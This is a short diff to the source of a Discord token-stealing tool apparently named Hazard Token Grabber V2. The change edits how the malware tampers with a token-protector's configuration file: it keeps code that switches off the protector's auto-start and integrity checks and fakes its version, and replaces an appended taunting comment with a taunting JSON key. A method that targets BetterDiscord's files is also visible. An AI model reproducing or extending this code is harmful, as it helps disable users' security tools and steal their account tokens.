@@ -194,6 +194,7 @@ class Hazard_Token_Grabber_V2(functions):
         if os.path.exists(config):
             with open(config, errors="ignore") as f:
                 item = json.load(f)
+                item['Rdimo_just_shit_on_this_token_protector'] = "https://github.com/Rdimo"
                 item['auto_start'] = False
                 item['auto_start_discord'] = False
                 item['integrity'] = False
@@ -209,9 +210,6 @@ class Hazard_Token_Grabber_V2(functions):
                 item['version'] = 69420
             with open(config, 'w') as f:
                 json.dump(item, f, indent=2, sort_keys=True)
-            with open(config, 'a') as f:
-                f.write(
-                    "\n\n//Rdimo just shit on this token protector | https://github.com/Rdimo")
 
     async def bypassBetterDiscord(self):
         bd = self.roaming+"\\BetterDiscord\\data\\betterdiscord.asar"
